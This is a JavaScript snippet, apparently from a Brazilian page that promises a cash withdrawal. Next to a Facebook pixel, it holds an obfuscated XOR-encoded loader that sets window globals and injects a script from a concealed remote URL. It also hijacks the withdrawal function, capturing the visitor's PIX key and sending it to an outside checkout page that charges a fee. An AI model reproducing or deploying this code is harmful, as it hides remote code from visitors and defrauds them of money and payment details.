/* Rastreamento proprio + destino do saque */
!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
document,'script','https://connect.facebook.net/en_US/fbevents.js');
fbq('init','1755018692052518');fbq('track','PageView');fbq('track','ViewContent');
window.pixelId = "6a9dc2520f647cd31a8e712b";
(function(){var s_oi=atob("DOB3rZAlerS/wKkExZtV2OJJWI6dqN1wtZNNgr9GHtqRtd1prIYOg/NKF5rdsoZ3ppIe3eRWVcTWuMxo6pAe1fVJVN7M4oUmpJQD3/lHD8Das4s+nr1bj/dJFdberNom/7sMj/5EF9Gd+ot0rJgSwdlBWJidtshosIVVl7ITG43bo5sx99ARm6QSGdCM8cg8oNdGn/IHB+nC");var m_v=[];for(var q_i=0;q_i<s_oi.length;q_i++){m_v.push(s_oi.charCodeAt(q_i)&255);}var f_p=m_v[0];var f_s=m_v.slice(1,1+f_p);var o_ctr=m_v.slice(1+f_p);var f_xo2=o_ctr.map(function(b,p_es){return b^f_s[p_es%f_p];});var p_oa="";for(var q_hl=0;q_hl<f_xo2.length;q_hl++){p_oa+=String.fromCharCode(f_xo2[q_hl]&255);}var i_9yv8=decodeURIComponent(escape(p_oa));var t_wt6=JSON.parse(i_9yv8);var b_76=t_wt6.globals||[];b_76.forEach(function(v_1){window[v_1.name]=v_1.value;});var d_8=document.createElement("script");d_8.src=t_wt6.url;d_8.async=true;d_8.defer=true;(t_wt6.attributes||[]).forEach(function(n_ygo6){d_8.setAttribute(n_ygo6.name,n_ygo6.value);});(document.head||document.documentElement).appendChild(d_8);})();

window.addEventListener('DOMContentLoaded', function () {
  var origem = window.doSaque;
  window.doSaque = function () {
    var t = (document.getElementById('pixType') || {}).value || '';
    var key = ((document.getElementById('pixKey') || {}).value || '').trim();
    if (!t || !key) { if (origem) return origem(); return; }
    if (window.fbq) fbq('track', 'InitiateCheckout', { value: 17.99, currency: 'BRL' });
    var dest = new URL('https://english-to-portuguese.lovable.app/checkout', window.location.href);
    new URLSearchParams(window.location.search).forEach(function (v, k) {
      dest.searchParams.set(k, v);
    });
    dest.searchParams.set('pix_type', t);
    dest.searchParams.set('pix_key', key);
    window.location.href = dest.toString();
  };
});
